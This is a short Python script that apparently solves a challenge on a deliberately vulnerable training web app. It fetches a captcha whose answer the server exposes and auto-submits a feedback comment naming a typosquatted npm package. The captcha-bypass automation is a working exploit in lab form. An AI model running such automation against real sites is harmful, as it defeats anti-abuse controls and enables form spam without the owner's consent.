from urllib.request import urlopen, Request
from webbrowser import open as browseropen
from json import dumps, load

# response = urlopen("http://15.236.144.183:8082/3rdpartylicenses.txt")
# for x in response.readlines():
#     if x.startswith(b"@"):
#         browseropen("https://www.npmjs.com/package/" + x.strip(b'@').decode())

# exit()
response = urlopen(
    Request(
        "http://15.236.144.183:8082/rest/captcha/",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "http://15.236.144.183:8082",
            "Referer": "http://15.236.144.183:8082/",
            "Cookie": (
                "language=en; welcomebanner_status=dismiss;"
                " continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
                "TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
                "_status=dismiss"
            ),
        },
    )
)
data = load(response)
response = urlopen(
    Request(
        "http://15.236.144.183:8082/api/Feedbacks/",
        data=dumps({
            "captchaId": data["captchaId"],
            "captcha": data["answer"],
            "comment": 'anuglar2-qrcode',
            "rating": 1,
        }).encode(),
        method="POST",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "http://15.236.144.183:8082",
            "Referer": "http://15.236.144.183:8082/",
            "Cookie": (
                "language=en; welcomebanner_status=dismiss;"
                " continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
                "TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
                "_status=dismiss"
            ),
        },
    )
)